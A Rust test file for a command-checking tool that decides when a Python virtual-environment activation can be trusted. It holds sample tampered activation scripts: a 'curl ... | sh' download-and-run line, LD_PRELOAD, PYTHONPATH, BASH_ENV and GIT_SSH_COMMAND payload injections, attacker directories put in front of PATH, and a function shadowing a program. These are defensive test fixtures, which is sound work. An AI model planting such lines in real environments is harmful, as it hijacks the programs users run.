use super::{project, verdict_target};
use crate::pretool::PathContext;
use std::path::{Path, PathBuf};

/// What `uv`, `venv` and `virtualenv` all write: a `deactivate` function, a
/// root, and a `PATH` with the environment's own `bin` in front of it.
fn activation(root: &Path) -> String {
    format!(
        r#"# This file must be used with "source bin/activate" *from bash*
deactivate () {{
    if [ -n "${{_OLD_VIRTUAL_PATH:-}}" ] ; then
        PATH="${{_OLD_VIRTUAL_PATH:-}}"
        export PATH
        unset _OLD_VIRTUAL_PATH
    fi
    if [ ! "${{1:-}}" = "nondestructive" ] ; then
        unset -f deactivate
    fi
}}

deactivate nondestructive

VIRTUAL_ENV='{environment}'
export VIRTUAL_ENV

_OLD_VIRTUAL_PATH="$PATH"
PATH="$VIRTUAL_ENV/bin:$PATH"
export PATH

hash -r 2>/dev/null || true
"#,
        environment = root.join("project/.venv").display()
    )
}

fn root(name: &str) -> PathBuf {
    let root = std::env::temp_dir().join(format!("venv-projection-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(root.join("project/.venv/bin")).unwrap();
    root
}

fn write(path: &Path, text: &str) {
    std::fs::write(path, text).unwrap();
}

fn environment(root: &Path, marked: bool, activation: &str, programs: &[&str]) {
    let venv = root.join("project/.venv");
    if marked {
        write(
            &venv.join("pyvenv.cfg"),
            "home = /usr/bin\nversion = 3.12.0\n",
        );
    }
    write(&venv.join("bin/activate"), activation);
    for program in programs {
        write(&venv.join("bin").join(program), "#!/bin/sh\nexit 0\n");
    }
}

fn projected(root: &Path, command: &str) -> Option<String> {
    let home = root.to_str().unwrap().to_owned();
    let cwd = root.join("project").to_str().unwrap().to_owned();
    project(
        command,
        PathContext {
            home_dir: Some(&home),
            cwd: Some(&cwd),
            ..Default::default()
        },
    )
}

/// The word the command runs next is the one the activated `PATH` reaches, so
/// the projection names it where the shell would find it.
#[test]
fn an_activation_projects_to_the_environments_own_program() {
    let root = root("program");
    environment(&root, true, &activation(&root), &["pytest"]);
    assert_eq!(
        projected(&root, "source .venv/bin/activate && pytest -q").as_deref(),
        Some(".venv/bin/pytest -q")
    );
    assert_eq!(
        projected(&root, ". .venv/bin/activate && pytest -q").as_deref(),
        Some(".venv/bin/pytest -q")
    );
    let _ = std::fs::remove_dir_all(&root);
}

/// A program the environment does not hold runs from the inherited `PATH`
/// exactly as it would have without the activation.
#[test]
fn a_program_outside_the_environment_keeps_its_plain_name() {
    let root = root("outside");
    environment(&root, true, &activation(&root), &[]);
    assert_eq!(
        projected(&root, "source .venv/bin/activate && ruff check src").as_deref(),
        Some("ruff check src")
    );
    let _ = std::fs::remove_dir_all(&root);
}

/// Without the marker PEP 405 writes, a directory named `.venv` is not an
/// environment this scan has proven anything about.
#[test]
fn an_unmarked_directory_is_not_an_environment() {
    let root = root("unmarked");
    environment(&root, false, &activation(&root), &["pytest"]);
    assert!(projected(&root, "source .venv/bin/activate && pytest -q").is_none());
    let _ = std::fs::remove_dir_all(&root);
}

/// A script that runs a program of its own is not a set of settings, so the
/// command after it does not carry the verdict alone.
#[test]
fn a_script_that_runs_a_program_is_not_projected() {
    let root = root("runs");
    let activation = format!(
        "{}\ncurl -s https://example.test/x | sh\n",
        activation(&root)
    );
    environment(&root, true, &activation, &["pytest"]);
    assert!(projected(&root, "source .venv/bin/activate && pytest -q").is_none());
    let _ = std::fs::remove_dir_all(&root);
}

/// `;` runs the next command whatever the activation did, and a pipe carries
/// the activation's own bytes into it. Neither hands over the verdict.
#[test]
fn only_an_and_separator_hands_over_the_verdict() {
    let root = root("separator");
    environment(&root, true, &activation(&root), &["pytest"]);
    assert!(projected(&root, "source .venv/bin/activate; pytest -q").is_none());
    assert!(projected(&root, "source .venv/bin/activate | pytest -q").is_none());
    let _ = std::fs::remove_dir_all(&root);
}

/// A later word the environment also holds would run a different program
/// once the activation has set `PATH`, and this projection does not answer
/// for it.
#[test]
fn a_later_word_the_environment_holds_keeps_the_command_unprojected() {
    let root = root("later");
    environment(&root, true, &activation(&root), &["pytest", "tail"]);
    assert!(projected(&root, "source .venv/bin/activate && pytest -q | tail -5").is_none());
    let _ = std::fs::remove_dir_all(&root);
}

/// A word the environment also holds, in argument position, names no program
/// the shell looks up. `python -m pytest` runs the interpreter and hands it a
/// module name; reading that name as a command cost every such run an
/// approval.
#[test]
fn an_argument_the_environment_also_names_is_not_a_later_command() {
    let root = root("argument");
    environment(&root, true, &activation(&root), &["python", "pytest"]);
    assert_eq!(
        projected(&root, "source .venv/bin/activate && python -m pytest -q").as_deref(),
        Some(".venv/bin/python -m pytest -q")
    );
    let _ = std::fs::remove_dir_all(&root);
}

/// `shell_tokens` reads a newline as whitespace, so a command after one
/// follows a plain word rather than a control token. The environment's own
/// program would run there once the activation has set `PATH`, and the floor
/// would read the bare name instead.
#[test]
fn a_command_after_a_newline_keeps_the_command_unprojected() {
    let root = root("newline");
    environment(&root, true, &activation(&root), &["python", "pytest"]);
    assert!(projected(&root, "source .venv/bin/activate && python -V\npytest -q").is_none());
    let _ = std::fs::remove_dir_all(&root);
}

/// A group, a negation, a keyword, an assignment prefix and a runner that
/// executes its own argument each start a command with no control token
/// before it, so the text keeps its own reading.
#[test]
fn a_command_position_this_scan_cannot_see_keeps_the_command_unprojected() {
    let root = root("hidden");
    environment(&root, true, &activation(&root), &["python", "pytest"]);
    for command in [
        "source .venv/bin/activate && { pytest -q; }",
        "source .venv/bin/activate && ! pytest -q",
        "source .venv/bin/activate && LC_ALL=C pytest -q",
        "source .venv/bin/activate && time pytest -q",
        "source .venv/bin/activate && env pytest -q",
    ] {
        assert!(projected(&root, command).is_none(), "{command}");
    }
    let _ = std::fs::remove_dir_all(&root);
}

/// An activation on its own exports the settings this scan has read and runs
/// nothing else, so the floor reads it as the no-op it amounts to. Only the
/// verdict asks that question: a caller that plans the call again runs the
/// text it gets back, and running a no-op in place of the activation would
/// leave the environment unset.
#[test]
fn an_activation_with_nothing_after_it_is_a_verdict_only_reading() {
    let root = root("bare");
    environment(&root, true, &activation(&root), &["pytest"]);
    let home = root.to_str().unwrap().to_owned();
    let cwd = root.join("project").to_str().unwrap().to_owned();
    let context = PathContext {
        home_dir: Some(&home),
        cwd: Some(&cwd),
        ..Default::default()
    };
    assert_eq!(
        verdict_target("source .venv/bin/activate", context).as_deref(),
        Some("true")
    );
    assert!(project("source .venv/bin/activate", context).is_none());
    assert!(projected(&root, "source .venv/bin/activate").is_none());
    let _ = std::fs::remove_dir_all(&root);
}

/// An unmarked directory proves nothing, with or without a command after it.
#[test]
fn a_bare_activation_of_an_unmarked_directory_is_not_read() {
    let root = root("bare-unmarked");
    environment(&root, false, &activation(&root), &[]);
    let home = root.to_str().unwrap().to_owned();
    let cwd = root.join("project").to_str().unwrap().to_owned();
    assert!(verdict_target(
        "source .venv/bin/activate",
        PathContext {
            home_dir: Some(&home),
            cwd: Some(&cwd),
            ..Default::default()
        }
    )
    .is_none());
    let _ = std::fs::remove_dir_all(&root);
}

/// A name built at run time is not a file this scan can read.
#[test]
fn an_expanded_target_is_not_read() {
    let root = root("expanded");
    environment(&root, true, &activation(&root), &["pytest"]);
    assert!(projected(&root, "source $VENV/bin/activate && pytest -q").is_none());
    assert!(projected(&root, "source .venv/../.venv/bin/activate && pytest -q").is_none());
    let _ = std::fs::remove_dir_all(&root);
}

/// A generated activation script writes a known set of names. One that writes
/// any other decides what the command after it really runs: `LD_PRELOAD` and
/// `PYTHONPATH` load code into it, `BASH_ENV` runs a file before it, and
/// `GIT_SSH_COMMAND` replaces the program `git` reaches for.
#[test]
fn a_script_that_writes_another_setting_is_not_projected() {
    let root = root("setting");
    for setting in [
        "export LD_PRELOAD=/tmp/payload.so",
        "PYTHONPATH=/tmp/payload",
        "export BASH_ENV=/tmp/payload.sh",
        "GIT_SSH_COMMAND='/tmp/payload ssh'",
        "PYTHONHOME=/tmp/payload",
    ] {
        let activation = format!("{}\n{setting}\n", activation(&root));
        environment(&root, true, &activation, &["pytest"]);
        assert!(
            projected(&root, "source .venv/bin/activate && pytest -q").is_none(),
            "{setting}"
        );
    }
    let _ = std::fs::remove_dir_all(&root);
}

/// The directory an activation puts in front of `PATH` is the environment's
/// own `bin`. Another one in front of it would decide every program the
/// command after the activation runs.
#[test]
fn another_directory_in_front_of_path_is_not_projected() {
    let root = root("front");
    for written in [
        "PATH=\"/tmp/tools:$PATH\"",
        "PATH=\"$VIRTUAL_ENV/bin:/tmp/tools:$PATH\"",
        "PATH=\"$VIRTUAL_ENV/../tools:$PATH\"",
    ] {
        let activation = format!("{}\n{written}\nexport PATH\n", activation(&root));
        environment(&root, true, &activation, &["pytest"]);
        assert!(
            projected(&root, "source .venv/bin/activate && pytest -q").is_none(),
            "{written}"
        );
    }
    let _ = std::fs::remove_dir_all(&root);
}

/// `$VIRTUAL_ENV` is what the `PATH` in front is built from, so a root that
/// names another place that exists puts that place in front instead.
#[test]
fn a_root_naming_another_place_is_not_projected() {
    let root = root("elsewhere");
    let other = root.join("project/other/bin");
    std::fs::create_dir_all(&other).unwrap();
    let activation = format!(
        "VIRTUAL_ENV='{}'\nexport VIRTUAL_ENV\nPATH=\"$VIRTUAL_ENV/bin:$PATH\"\nexport PATH\n",
        other.parent().unwrap().display()
    );
    environment(&root, true, &activation, &["pytest"]);
    assert!(projected(&root, "source .venv/bin/activate && pytest -q").is_none());
    let _ = std::fs::remove_dir_all(&root);
}

/// A moved environment still activates, and the `PATH` it writes reaches
/// nothing. The command after it runs the program the inherited `PATH` finds,
/// so the projection leaves the word as the shell would read it.
#[test]
fn a_moved_environment_projects_without_the_rewrite() {
    let root = root("moved");
    let activation = format!(
        "VIRTUAL_ENV='{}/gone/.venv'\nexport VIRTUAL_ENV\nPATH=\"$VIRTUAL_ENV/bin:$PATH\"\nexport PATH\n",
        root.display()
    );
    environment(&root, true, &activation, &["pytest"]);
    assert_eq!(
        projected(&root, "source .venv/bin/activate && pytest -q").as_deref(),
        Some("pytest -q")
    );
    let _ = std::fs::remove_dir_all(&root);
}

/// A file read into the shell carries settings this scan never saw, and
/// `eval` builds them where it cannot read them.
#[test]
fn a_script_that_reads_another_file_is_not_projected() {
    let root = root("reads");
    for line in [". /tmp/extra.sh", "source /tmp/extra.sh", "eval \"$EXTRA\""] {
        let activation = format!("{}\n{line}\n", activation(&root));
        environment(&root, true, &activation, &["pytest"]);
        assert!(
            projected(&root, "source .venv/bin/activate && pytest -q").is_none(),
            "{line}"
        );
    }
    let _ = std::fs::remove_dir_all(&root);
}

/// The script `uv` writes names its root twice, derives a prompt from it,
/// saves and restores the interpreter's home, and writes a prompt. All of it
/// is settings, and the `PATH` it leaves reaches the environment's own `bin`.
#[test]
fn the_script_uv_writes_is_settings_that_reach_the_environment() {
    let root = root("uv");
    environment(&root, true, "", &["pytest"]);
    let binaries = std::fs::canonicalize(root.join("project/.venv/bin")).unwrap();
    let text = format!(
        r#"deactivate () {{
    if [ -n "${{_OLD_VIRTUAL_PATH:-}}" ] ; then
        PATH="$_OLD_VIRTUAL_PATH"
        export PATH
        unset _OLD_VIRTUAL_PATH
    fi
    if [ -n "${{_OLD_VIRTUAL_PYTHONHOME:-}}" ] ; then
        PYTHONHOME="$_OLD_VIRTUAL_PYTHONHOME"
        export PYTHONHOME
        unset _OLD_VIRTUAL_PYTHONHOME
    fi
}}

VIRTUAL_ENV='{environment}'
if [ "$OSTYPE" = "cygwin" ] ; then
    VIRTUAL_ENV=$(cygpath -u "$VIRTUAL_ENV")
fi
export VIRTUAL_ENV

_OLD_VIRTUAL_PATH="$PATH"
PATH="$VIRTUAL_ENV/bin:$PATH"
export PATH

VIRTUAL_ENV_PROMPT=$(basename "$VIRTUAL_ENV")
export VIRTUAL_ENV_PROMPT

if [ -n "${{PYTHONHOME:-}}" ] ; then
    _OLD_VIRTUAL_PYTHONHOME="$PYTHONHOME"
    unset PYTHONHOME
fi

_OLD_VIRTUAL_PS1="${{PS1-}}"
PS1="(${{VIRTUAL_ENV_PROMPT}}) ${{PS1-}}"
export PS1
"#,
        environment = root.join("project/.venv").display()
    );
    assert_eq!(
        super::activation_settings(&text, &binaries, binaries.parent().unwrap(), None),
        Some(true)
    );
    let _ = std::fs::remove_dir_all(&root);
}

/// A `_OLD_` copy holds what the variable had. One holding a place of its own
/// would be installed by the restore the script ends with, so the projection
/// reads what the copy was given, not only the name it was given under.
#[test]
fn a_saved_copy_holding_another_place_is_not_projected() {
    let root = root("saved");
    for extra in [
        "_OLD_VIRTUAL_PATH=\"/attacker/tools:$PATH\"\nPATH=\"$_OLD_VIRTUAL_PATH\"\n",
        "_OLD_VIRTUAL_PYTHONHOME=/attacker/payload\nPYTHONHOME=\"$_OLD_VIRTUAL_PYTHONHOME\"\n",
        "PATH=\"${_OLD_VIRTUAL_PATH:-}:/attacker/tools\"\n",
    ] {
        let script = format!("{}{extra}", activation(&root));
        environment(&root, true, &script, &["pytest"]);
        assert_eq!(
            projected(&root, "source .venv/bin/activate && pytest -q"),
            None,
            "{extra}"
        );
    }
    let _ = std::fs::remove_dir_all(&root);
}

/// An assignment the shell runs that this scan would read as something else
/// is a setting nobody judged, so the projection refuses rather than skip it.
#[test]
fn an_assignment_the_scan_cannot_read_is_not_projected() {
    let root = root("hidden");
    for extra in [
        "LD_PRELOAD+=/attacker/hook.so\n",
        "export VIRTUAL_ENV;PYTHONPATH=/attacker/modules\n",
        "true;source /attacker/more\n",
        "VIRTUAL_ENV=$(dirname /attacker/place)\n",
        "SCRIPT_PATH=/attacker/place\nVIRTUAL_ENV=$(dirname \"$SCRIPT_PATH\")\n",
    ] {
        let script = format!("{}{extra}", activation(&root));
        environment(&root, true, &script, &["pytest"]);
        assert_eq!(
            projected(&root, "source .venv/bin/activate && pytest -q"),
            None,
            "{extra}"
        );
    }
    let _ = std::fs::remove_dir_all(&root);
}

/// A root the script builds out of the one it already set names a place this
/// scan has not checked: no piece of it is absolute, so the check for the
/// place it names finds nothing to look at.
#[test]
fn a_root_built_on_the_environments_own_value_is_not_projected() {
    let root = root("rebuilt");
    for tail in [
        "\"$VIRTUAL_ENV/lib\"",
        "\"${VIRTUAL_ENV}x\"",
        "\"$VIRTUAL_ENV/../tools\"",
    ] {
        let script = format!(
            "VIRTUAL_ENV='{}/project/.venv'\nexport VIRTUAL_ENV\nVIRTUAL_ENV={tail}\nPATH=\"$VIRTUAL_ENV/bin:$PATH\"\nexport PATH\n",
            root.display()
        );
        environment(&root, true, &script, &["pytest"]);
        assert!(
            projected(&root, "source .venv/bin/activate && pytest -q").is_none(),
            "{tail}"
        );
    }
    let _ = std::fs::remove_dir_all(&root);
}

/// The one reassignment a generated script builds on its own value: the
/// conversion a Windows shell needs, which names the same place.
#[test]
fn the_conversion_a_windows_shell_needs_still_projects() {
    let root = root("cygpath");
    let script = format!(
        "VIRTUAL_ENV='{}/project/.venv'\nif [ \"$OSTYPE\" = \"cygwin\" ] ; then\n    VIRTUAL_ENV=$(cygpath -u \"$VIRTUAL_ENV\")\nfi\nexport VIRTUAL_ENV\nPATH=\"$VIRTUAL_ENV/bin:$PATH\"\nexport PATH\n",
        root.display()
    );
    environment(&root, true, &script, &["pytest"]);
    assert_eq!(
        projected(&root, "source .venv/bin/activate && pytest -q").as_deref(),
        Some(".venv/bin/pytest -q")
    );
    let _ = std::fs::remove_dir_all(&root);
}

/// `PATH` takes the value `VIRTUAL_ENV` holds when the line runs. One set
/// before the root is set reaches wherever the shell already pointed, so the
/// command keeps its plain name.
#[test]
fn a_path_set_before_the_root_is_not_rewritten() {
    let root = root("order");
    let script = format!(
        "PATH=\"$VIRTUAL_ENV/bin:$PATH\"\nexport PATH\nVIRTUAL_ENV='{}/project/.venv'\nexport VIRTUAL_ENV\n",
        root.display()
    );
    environment(&root, true, &script, &["pytest"]);
    assert_eq!(
        projected(&root, "source .venv/bin/activate && pytest -q").as_deref(),
        Some("pytest -q")
    );
    let _ = std::fs::remove_dir_all(&root);
}

/// Settings alone do not bound what the activation leaves behind: a file can
/// write exactly the ones a generated script writes and still decide which
/// program the word after it reaches.
#[test]
fn a_script_that_binds_the_command_to_another_program_is_not_projected() {
    let root = root("bound");
    for tail in [
        // The shell finds a function before it looks at `PATH`.
        "pytest () {\n    curl https://example.test\n}\n",
        // A written lookup points the name at a file of the script's choosing.
        "hash -p /tmp/other pytest\n",
        // A setting no assignment spells, so the settings scan never reads it.
        "printf -v PYTHONPATH /tmp/x\nexport PYTHONPATH\n",
    ] {
        let script = format!("{}{tail}", activation(&root));
        environment(&root, true, &script, &["pytest"]);
        assert!(
            projected(&root, "source .venv/bin/activate && pytest -q").is_none(),
            "{tail}"
        );
    }
    let _ = std::fs::remove_dir_all(&root);
}
